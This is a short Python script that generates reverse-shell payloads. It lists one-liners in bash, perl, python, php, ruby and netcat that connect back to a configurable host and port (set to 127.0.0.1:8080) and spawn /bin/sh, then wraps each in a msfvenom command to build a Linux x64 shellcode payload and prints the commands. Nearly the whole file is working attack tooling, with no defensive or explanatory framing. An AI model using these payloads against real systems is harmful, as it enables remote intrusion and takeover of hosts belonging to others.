#!/usr/bin/env python
import random
import socket
import struct

def random_ipv4(): return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

ip = "127.0.0.1"
port = "8080"

# type 1
rev_shell_ip_port = """bash -i >& /dev/tcp/{}/{} 0>&1
perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
nc -e /bin/sh {} {}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f
/bin/sh | nc {} {}
rm -f /tmp/p; mknod /tmp/p p && nc {} {} 0/tmp/p""".split('\n')

# type 2
rev_shell_port_ip = """perl -e 'use Socket;$p={};$i="{}";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' """.split('\n')

def msfvenom_command_gen(cmd):
    return  'rev_sh=\'{}\'; echo "$rev_sh"; '.format(cmd.replace('\'', '\'\\\'\'')) +\
        'msfvenom -p linux/x64/exec CMD="$rev_sh" -f c {}'.format('')

# type1
for rev_shell in rev_shell_ip_port:
    payload = rev_shell.format(ip ,port)
    shell_gen = msfvenom_command_gen(payload)
    print(shell_gen)

# type2
for rev_shell in rev_shell_port_ip:
    payload = rev_shell.format(port, ip)
    shell_gen = msfvenom_command_gen(payload)
    print(shell_gen)
